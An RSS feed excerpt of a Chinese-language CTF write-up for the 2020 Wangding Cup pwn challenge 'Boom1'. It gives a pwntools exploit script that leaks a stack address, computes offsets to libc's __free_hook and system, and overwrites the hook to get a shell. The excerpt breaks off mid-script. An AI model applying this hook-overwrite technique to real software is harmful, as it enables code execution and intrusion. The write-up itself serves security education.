<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>WDCUP2020 on NiceSeven&#39;s Website</title>
    <link>https://niceseven.github.io/categories/wdcup2020/</link>
    <description>Recent content in WDCUP2020 on NiceSeven&#39;s Website</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 13 May 2020 23:03:22 +0800</lastBuildDate>
    
	<atom:link href="https://niceseven.github.io/categories/wdcup2020/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>WDCUP2020 Pwn Boom1</title>
      <link>https://niceseven.github.io/post/2020/05/13/wdcup2020-pwn-boom1/</link>
      <pubDate>Wed, 13 May 2020 23:03:22 +0800</pubDate>
      
      <guid>https://niceseven.github.io/post/2020/05/13/wdcup2020-pwn-boom1/</guid>
      <description>2020网鼎杯 Pwn Boom1 考点：
1、VM
2、C语言指针
我们可以输入c语言代码，以；结束，需要有main(){}，并且主函数内只能执行一次函数
思路：
定义个int a，然后printf(&amp;quot;%p&amp;rdquo;,&amp;amp;a)打印出a的地址，然后用gdb调试找到__free_hook和system相对&amp;amp;a的偏移，以&amp;amp;a为基计算__free_hook和system的地址，然后覆盖__free_hook为system地址，执行free(&amp;quot;/bin/sh&amp;rdquo;)来getshell
为了更快的找到__free_hook和system的地址，我们需要知道libc版本
打印出&amp;amp;a的地址
计算&amp;amp;a到显示libc版本号的地址偏移，-7251476
但是这里定义a为int类型地址8字节为单位，所以-7251476/8=-906434才是实际偏移
因为是字符串所以偏移地址需要微调为-906435，才能puts出2.23，当然这里也可用char a来定义偏移就不需要除以8了
我们知道libc为2.23了，然后就是计算free_hook和system相对与&amp;amp;a的偏移了
利用pwntools中的ELF模块，得出libc.so.6中free_hook和system的偏移，然后用实际的基地址来相加得出准确地址
然后利用得到的&amp;amp;a地址来distance计算偏移
&amp;amp;a-3553328 -&amp;gt; __free_hook
&amp;amp;a-7084680 -&amp;gt; system
因为我们覆盖的__free_hook有8字节，所以我们定义一个int a来传数据，同时偏移也都要除以8，当然用char也可以强制装换为int指针(int*)来覆盖hook，但是偏移还是要除以8，所以直接用int比较好
from pwn import * p = process([&amp;#34;/tmp/ld-2.23.so&amp;#34;, &amp;#34;./pwn1&amp;#34;], env={&amp;#34;LD_PRELOAD&amp;#34;:&amp;#34;libc.so.6&amp;#34;}) libc = ELF(&amp;#39;./libc.so.6&amp;#39;) #p=process(&amp;#39;./pwn1&amp;#39;) context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;sp&amp;#39;, &amp;#39;-h&amp;#39;] context.log_level =&amp;#39;debug&amp;#39; print (&amp;#34;libc:__free_hook &amp;#34; + hex(libc.symbols[&amp;#39;__free_hook&amp;#39;])) print (&amp;#34;libc:system &amp;#34; + hex(libc.symbols[&amp;#39;system&amp;#39;])) gdb.attach(p) #payload = &amp;#39;&amp;#39;&amp;#39;main(){char a;puts(&amp;amp;a-7251476);}&amp;#39;&amp;#39;&amp;#39;#用来leak libc版本 #payload = &amp;#39;&amp;#39;&amp;#39;main(){int a;printf(&amp;#34;%p &amp;#34;,&amp;amp;a);}&amp;#39;&amp;#39;&amp;#39;#用来hook和system计算相对a地址的偏移 #*(&amp;amp;a-444166)-&amp;gt;__free_hook #&amp;amp;a-885585-&amp;gt;system #含义就是覆盖__free_hook-&amp;gt;system，这样在free的时候就是执行system payload = &amp;#39;&amp;#39;&amp;#39;main(){int a;*(&amp;amp;a-444166)=&amp;amp;a-885585;free(&amp;#34;/bin/sh&amp;#34;);}&amp;#39;&amp;#39;&amp;#39; #payload = &amp;#39;&amp;#39;&amp;#39;main(){char a;*((int*)&amp;amp;a-444166)=&amp;amp;a-885585;free(&amp;#34;/bin/sh&amp;#34;);}&amp;#39;&amp;#39;&amp;#39; payload = payload.</description>
    </item>
    
  </channel>
</rss>